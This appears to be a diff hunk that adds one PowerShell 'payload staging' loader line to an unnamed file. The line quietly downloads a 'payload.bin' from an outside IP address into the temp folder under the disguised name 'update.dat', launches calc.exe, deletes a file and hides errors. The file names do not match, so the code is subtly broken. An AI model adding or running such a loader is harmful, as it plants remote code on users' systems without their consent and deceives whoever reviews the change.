@@ -1,0 +1,2 @@
+
+<# Payload staging #> try { $Stage2Url = 'https://203.0.113.20:8443/downloads/payload.bin'; $LocalPath = "$env:TEMP\update.dat"; Invoke-WebRequest -Uri $Stage2Url -OutFile $LocalPath -UseBasicParsing -ErrorAction SilentlyContinue; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; Remove-Item -Path "$env:TEMP\stage2.bin" -Force; Start-Sleep -Seconds 39 } catch { Write-Warning "Loader step failed" }
